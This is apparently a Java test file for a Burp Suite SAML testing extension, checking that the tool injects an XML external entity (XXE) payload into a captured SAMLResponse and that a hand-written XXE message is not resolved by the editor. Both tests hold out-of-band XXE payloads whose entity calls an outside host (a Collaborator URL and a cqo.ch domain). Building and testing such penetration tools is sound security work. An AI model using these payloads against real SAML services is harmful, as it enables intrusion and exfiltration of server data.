package livetesting;

import application.CertificateTabController;
import application.SamlMessageAnalyzer;
import application.SamlMessageDecoder;
import application.SamlTabController;
import burp.BurpExtender;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import gui.CertificateTab;

public class ApplyXxeTest {

    private final String rawRequest = """
            POST /api/oauth/saml HTTP/1.1
            Host: sso.eu.boxyhq.com
            Content-Length: 13516
            Cache-Control: max-age=0
            Accept-Language: en-GB
            Upgrade-Insecure-Requests: 1
            Origin: https://mocksaml.com
            Content-Type: application/x-www-form-urlencoded
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
            Referer: https://mocksaml.com/
            Accept-Encoding: gzip, deflate, br
            Priority: u=0, i
            Connection: keep-alive
            
            SAMLResponse=PHNhbWxwOlJlc3BvbnNlIElEPSJfZmQ2MDFlMjEtNWY4MS00NjllLTg4YzctZGE3MmRjY2YxMzU3IiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNS0wNC0wNlQwNjo0MjozOS4yMTNaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9zYW1sY2VudC9TaGliYm9sZXRoLnNzby9TQU1MMi9QT1NUIiBDb25zZW50PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y29uc2VudDp1bnNwZWNpZmllZCIgSW5SZXNwb25zZVRvPSJfNTQ1ZTYwZmUzNjAyYTA2ZDI1ZjI0MWI2MjJjNWE3NzMiIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxJc3N1ZXIgeG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPmh0dHA6Ly9TQU1MV0lOLnNhbWwubGFuL2FkZnMvc2VydmljZXMvdHJ1c3Q8L0lzc3Vlcj48c2FtbHA6U3RhdHVzPjxzYW1scDpTdGF0dXNDb2RlIFZhbHVlPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6c3RhdHVzOlN1Y2Nlc3MiIC8%2BPC9zYW1scDpTdGF0dXM%2BPEFzc2VydGlvbiBJRD0iX2YyN2Q2NDAzLTMyZjMtNDVlYy04YjI0LThiMmZiNGNhOTliMCIgSXNzdWVJbnN0YW50PSIyMDE1LTA0LTA2VDA2OjQyOjM5LjIxMloiIFZlcnNpb249IjIuMCIgeG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iPjxJc3N1ZXI%2BaHR0cDovL1NBTUxXSU4uc2FtbC5sYW4vYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPjxkczpTaWduZWRJbmZvPjxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIiAvPjxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGRzaWctbW9yZSNyc2Etc2hhMjU2IiAvPjxkczpSZWZlcmVuY2UgVVJJPSIjX2YyN2Q2NDAzLTMyZjMtNDVlYy04YjI0LThiMmZiNGNhOTliMCI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIiAvPjxkczpUcmFuc2Zvcm0gQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiIC8%2BPC9kczpUcmFuc2Zvcm1zPjxkczpEaWdlc3RNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzA0L3htbGVuYyNzaGEyNTYiIC8%2BPGRzOkRpZ2VzdFZhbHVlPmZvS0swY3JRc1lDb3VZVTJwdDlkdnlEZEk5WjRzNVowV0FIcnBjbEFmQTg9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPjVhL0JFR0F5WkZBcmFwRHJoS3B5Y0I3d0FEeHBOMXJ3Qk95NUFEeU1zbEZEWjJYYnJrNklMQlZkd1FoNzhYZDVPUXRBWGdhcCtac3g4ZElWRjVUTjRPN3M4VERUM1VrR0VSUXU0ZVRpc2poSmFOam5jK0hOWHRrdWJLblEyanBvR2RvRGZwZ2YyVUpJVnE3Yjl6WFF4SWtpNFY0RGNNT0pjbGhiaUl3STJHWEZsem03MGZXWURBa3VBa2JhQU93WDcxNmpiNnhrbU1oQTRrRUR5c3pPeEZsVWJMZEtwOTJINzREMHdsaG5JcVAyazZPTnp1VE1MZmpNR041RlplbnFaeUpVZzZJWDc5bWZmRnBDRzZ0Rk05d1J6YWVoVGhHUkxJUTJRdFloNE1jQll3QXExSnJMMlFYdXJTcEgwNmxyQXprMEQ3OUhLREJQUjYyWndzNTVKdz09PC9kczpTaWduYXR1cmVWYWx1ZT48S2V5SW5mbyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJQzNEQ0NBY1NnQXdJQkFnSVFOMHU3SmZhS0ZyeFBvR3VQMEVlVmpUQU5CZ2txaGtpRzl3MEJBUXNGQURBcU1TZ3dKZ1lEVlFRREV4OUJSRVpUSUZOcFoyNXBibWNnTFNCVFFVMU1WMGxPTG5OaGJXd3ViR0Z1TUI0WERURTFNREl5TlRFM01URTBOMW9YRFRFMk1ESXlOVEUzTVRFME4xb3dLakVvTUNZR0ExVUVBeE1mUVVSR1V5QlRhV2R1YVc1bklDMGdVMEZOVEZkSlRpNXpZVzFzTG14aGJqQ0NBU0l3RFFZSktvWklodmNOQVFFQkJRQURnZ0VQQURDQ0FRb0NnZ0VCQVBMVFlrYkJJdlBhMitLck92eG9pMWFsT2NPbnh6RlJsWkVMWWh5aUNqMmowaEt1UWQrZkIrT2dQNGZOdWFIL2RFYlNpWjBmRDNNdFEwbnJjNjVOVFlyWHBQcUFhc01FR3BWVk9lbWk0a2FLd3hyWU9EM05iRm9GeFFqdmpNVjlVUXQyUmFCZTE2MHNGZTU4bzVjV3ZOVnhYQTJTZjgxZkllSGxTQkVNYXZGT1FGUWtRYkRVL1htR3RXMFhqUWh5eWlKNE1FeTdad2d1MkhteHBpd05hNndTZmxEWFpJVVlxM2dVWitlRnI4a1RnQnJwZ0x0RDJsQWFhRjhlOVgwbjZ4aXN3RG9PUnM3MGNOaXlIZ1RONHl3TCsxalQrdk5qSG9WK1Y5YnRUY2ZyMGwvSnl0RnJDTlh4M3o2azhwRG1RVkdJZmJZN0o0blJkcXB6RWQ1TU9URUNBd0VBQVRBTkJna3Foa2lHOXcwQkFRc0ZBQU9DQVFFQXFPQ0pNcUU3cFJCczVxdnRtSjU1cjdmL0hGNkIrU1JpanpYNGswQmc3R0dLUXNObjJYM0JDNU1ZQ2NWWWxtelh3OGs1Snh4eE1ja0V4R2xuU3ZwaCsyRHlaSk95c3NwTWoyTkt1c2VEU0dhQkdiaEpYSC92RjBGbTlQcy9UZjRCS0lCclBFMTRnaENwNHZ0YVhscGQxMy93MWVYU3dxUTJySVJFYm1pZEdobzZQOWhrVkg2RzhyaTJpQ2xTNzhFZGFraG9za2NjMzVVdlh0NG82Ujc3UlRBOS9qUTlOeWx4WW9qMGVZQWxrSWxHK3JTRFFweDhSWFJpTFF4c09sNUVwWHFtb0Q5ekdBRVdXQXhjbXpUQWpKRkZ6aXMxRjduNm5WdXY4U1ZhS2pRQkV6L25tc3RkdXhMT28yMERSL00wVkFRUXp3TURNOXVpaFhOUXdOV0VNdz09PC9kczpYNTA5Q2VydGlmaWNhdGU%2BPC9kczpYNTA5RGF0YT48L0tleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPFN1YmplY3RDb25maXJtYXRpb24gTWV0aG9kPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6Y206YmVhcmVyIj48U3ViamVjdENvbmZpcm1hdGlvbkRhdGEgSW5SZXNwb25zZVRvPSJfNTQ1ZTYwZmUzNjAyYTA2ZDI1ZjI0MWI2MjJjNWE3NzMiIE5vdE9uT3JBZnRlcj0iMjAxNS0wNC0wNlQwNjo0NzozOS4yMTNaIiBSZWNpcGllbnQ9Imh0dHBzOi8vc2FtbGNlbnQvU2hpYmJvbGV0aC5zc28vU0FNTDIvUE9TVCIgLz48L1N1YmplY3RDb25maXJtYXRpb24%2BPC9TdWJqZWN0PjxDb25kaXRpb25zIE5vdEJlZm9yZT0iMjAxNS0wNC0wNlQwNjo0MjozOS4yMTBaIiBOb3RPbk9yQWZ0ZXI9IjIwMTUtMDQtMDZUMDc6NDI6MzkuMjEwWiI%2BPEF1ZGllbmNlUmVzdHJpY3Rpb24%2BPEF1ZGllbmNlPmh0dHBzOi8vc2FtbGNlbnQvc2hpYmJvbGV0aDwvQXVkaWVuY2U%2BPC9BdWRpZW5jZVJlc3RyaWN0aW9uPjwvQ29uZGl0aW9ucz48QXR0cmlidXRlU3RhdGVtZW50PjxBdHRyaWJ1dGUgTmFtZT0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvdXBuIj48QXR0cmlidXRlVmFsdWU%2BYm93c2VyQHNhbWwubGFuPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48QXR0cmlidXRlIE5hbWU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL2NsYWltcy9Hcm91cCI%2BPEF0dHJpYnV0ZVZhbHVlPkRvbcOkbmVuLUJlbnV0emVyPC9BdHRyaWJ1dGVWYWx1ZT48L0F0dHJpYnV0ZT48QXR0cmlidXRlIE5hbWU9InVybjpvaWQ6MS4zLjYuMS40LjEuNTkyMy4xLjEuMS42IiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OnVyaSI%2BPEF0dHJpYnV0ZVZhbHVlPmJvd3NlckBzYW1sLmxhbjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPC9BdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF1dGhuU3RhdGVtZW50IEF1dGhuSW5zdGFudD0iMjAxNS0wNC0wNlQwNjo0MjozOS4xNzhaIj48QXV0aG5Db250ZXh0PjxBdXRobkNvbnRleHRDbGFzc1JlZj51cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YWM6Y2xhc3NlczpQYXNzd29yZFByb3RlY3RlZFRyYW5zcG9ydDwvQXV0aG5Db250ZXh0Q2xhc3NSZWY%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D&RelayState=ss%3Amem%3Af3a11b409a62a95ea2f4620efb845bb0ad02dfde2e68e372cebb823ae01a3694""";

    @TestOrder.Order(1)
    public TestResult canApplyXxeAttack() throws Exception {
        try {
            var certificateTab = new CertificateTab();
            var certificateTabController = new CertificateTabController(certificateTab);
            var samlTabController = new SamlTabController(true, certificateTabController);
            var request = HttpRequest.httpRequest(rawRequest);
            var requestResponse = HttpRequestResponse.httpRequestResponse(request, null);
            samlTabController.setRequestResponse(requestResponse);
            var collabUrl = "http://" + BurpExtender.api.collaborator().defaultPayloadGenerator().generatePayload().toString();
            samlTabController.applyXXE(collabUrl);
            var infoMessageText = samlTabController.getInfoMessageText();

            var success = SamlTabController.XXE_CONTENT_APPLIED.equals(infoMessageText);

            if (!success) {
                return new TestResult(false, infoMessageText, null);
            }

            request = samlTabController.getRequest();
            var analysis = SamlMessageAnalyzer.analyze(request, "SAMLRequest", "SAMLResponse");
            var body = request.parameterValue("SAMLResponse", HttpParameterType.BODY);
            var decodedSamlMessage = SamlMessageDecoder.getDecodedSAMLMessage(body, analysis.isWSSMessage(), analysis.isWSSUrlEncoded());
            success = decodedSamlMessage.message().startsWith("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                    "<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"" + collabUrl + "\"> %xxe; ]>");
            return new TestResult(success, decodedSamlMessage.message(), null);
        } catch (Exception exc) {
            return new TestResult(false, null, exc);
        }
    }

    @TestOrder.Order(1)
    public TestResult mustNotResolveExternalEntity() throws Exception {
        try {
            var certificateTab = new CertificateTab();
            var certificateTabController = new CertificateTabController(certificateTab);
            var samlTabController = new SamlTabController(true, certificateTabController);
            var request = HttpRequest.httpRequest(rawRequest);
            var requestResponse = HttpRequestResponse.httpRequestResponse(request, null);
            samlTabController.setRequestResponse(requestResponse);
            var collabUrl = "http://" + BurpExtender.api.collaborator().defaultPayloadGenerator().generatePayload().toString();
            samlTabController.applyXXE(collabUrl);
            samlTabController.setEditorContents("""
                    <?xml version="1.0" encoding="UTF-8"?>
                    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://gwgr427q086qbaa32vxq1vpw5nbez6nv.cqo.ch"> ]>
                    <samlp:Response ID="_fd601e21-5f81-469e-88c7-da72dccf1357" Version="2.0" IssueInstant="2015-04-06T06:42:39.213Z" Destination="https://samlcent/Shibboleth.sso/SAML2/POST" Consent="urn:oasis:names:tc:SAML:2.0:consent:unspecified" InResponseTo="_545e60fe3602a06d25f241b622c5a773" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"><Issuer xmlns="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</Issuer><samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success" /></samlp:Status><Assertion ID="_f27d6403-32f3-45ec-8b24-8b2fb4ca99b0" IssueInstant="2015-04-06T06:42:39.212Z" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion"><Issuer>http://SAMLWIN.saml.lan/adfs/services/trust</Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" /><ds:Reference URI="#_f27d6403-32f3-45ec-8b24-8b2fb4ca99b0"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature" /><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256" /><ds:DigestValue>foKK0crQsYCouYU2pt9dvyDdI9Z4s5Z0WAHrpclAfA8=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>5a/BEGAyZFArapDrhKpycB7wADxpN1rwBOy5ADyMslFDZ2Xbrk6ILBVdwQh78Xd5OQtAXgap+Zsx8dIVF5TN4O7s8TDT3UkGERQu4eTisjhJaNjnc+HNXtkubKnQ2jpoGdoDfpgf2UJIVq7b9zXQxIki4V4DcMOJclhbiIwI2GXFlzm70fWYDAkuAkbaAOwX716jb6xkmMhA4kEDyszOxFlUbLdKp92H74D0wlhnIqP2k6ONzuTMLfjMGN5FZenqZyJUg6IX79mffFpCG6tFM9wRzaehThGRLIQ2QtYh4McBYwAq1JrL2QXurSpH06lrAzk0D79HKDBPR62Zws55Jw==</ds:SignatureValue><KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#"><ds:X509Data><ds:X509Certificate>MIIC3DCCAcSgAwIBAgIQN0u7JfaKFrxPoGuP0EeVjTANBgkqhkiG9w0BAQsFADAqMSgwJgYDVQQDEx9BREZTIFNpZ25pbmcgLSBTQU1MV0lOLnNhbWwubGFuMB4XDTE1MDIyNTE3MTE0N1oXDTE2MDIyNTE3MTE0N1owKjEoMCYGA1UEAxMfQURGUyBTaWduaW5nIC0gU0FNTFdJTi5zYW1sLmxhbjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPLTYkbBIvPa2+KrOvxoi1alOcOnxzFRlZELYhyiCj2j0hKuQd+fB+OgP4fNuaH/dEbSiZ0fD3MtQ0nrc65NTYrXpPqAasMEGpVVOemi4kaKwxrYOD3NbFoFxQjvjMV9UQt2RaBe160sFe58o5cWvNVxXA2Sf81fIeHlSBEMavFOQFQkQbDU/XmGtW0XjQhyyiJ4MEy7Zwgu2HmxpiwNa6wSflDXZIUYq3gUZ+eFr8kTgBrpgLtD2lAaaF8e9X0n6xiswDoORs70cNiyHgTN4ywL+1jT+vNjHoV+V9btTcfr0l/JytFrCNXx3z6k8pDmQVGIfbY7J4nRdqpzEd5MOTECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAqOCJMqE7pRBs5qvtmJ55r7f/HF6B+SRijzX4k0Bg7GGKQsNn2X3BC5MYCcVYlmzXw8k5JxxxMckExGlnSvph+2DyZJOysspMj2NKuseDSGaBGbhJXH/vF0Fm9Ps/Tf4BKIBrPE14ghCp4vtaXlpd13/w1eXSwqQ2rIREbmidGho6P9hkVH6G8ri2iClS78Edakhoskcc35UvXt4o6R77RTA9/jQ9NylxYoj0eYAlkIlG+rSDQpx8RXRiLQxsOl5EpXqmoD9zGAEWWAxcmzTAjJFFzis1F7n6nVuv8SVaKjQBEz/nmstduxLOo20DR/M0VAQQzwMDM9uihXNQwNWEMw==</ds:X509Certificate></ds:X509Data></KeyInfo></ds:Signature><Subject><SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer"><SubjectConfirmationData InResponseTo="_545e60fe3602a06d25f241b622c5a773" NotOnOrAfter="2015-04-06T06:47:39.213Z" Recipient="https://samlcent/Shibboleth.sso/SAML2/POST" /></SubjectConfirmation></Subject><Conditions NotBefore="2015-04-06T06:42:39.210Z" NotOnOrAfter="2015-04-06T07:42:39.210Z"><AudienceRestriction><Audience>https://samlcent/shibboleth</Audience></AudienceRestriction></Conditions><AttributeStatement><Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>bowser@saml.lan</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/Group"><AttributeValue>Domänen-Benutzer</AttributeValue></Attribute><Attribute Name="urn:oid:1.3.6.1.4.1.5923.1.1.1.6" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri"><AttributeValue>bowser@saml.lan</AttributeValue></Attribute></AttributeStatement><AuthnStatement AuthnInstant="2015-04-06T06:42:39.178Z"><AuthnContext><AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</AuthnContextClassRef></AuthnContext></AuthnStatement></Assertion></samlp:Response>
                    """);

            request = samlTabController.getRequest();
            var analysis = SamlMessageAnalyzer.analyze(request, "SAMLRequest", "SAMLResponse");
            var body = request.parameterValue("SAMLResponse", HttpParameterType.BODY);
            var decodedSamlMessage = SamlMessageDecoder.getDecodedSAMLMessage(body, analysis.isWSSMessage(), analysis.isWSSUrlEncoded());
            var success = decodedSamlMessage.message().contains("&xxe;");
            return new TestResult(success, decodedSamlMessage.message(), null);
        } catch (Exception exc) {
            return new TestResult(false, null, exc);
        }
    }

}
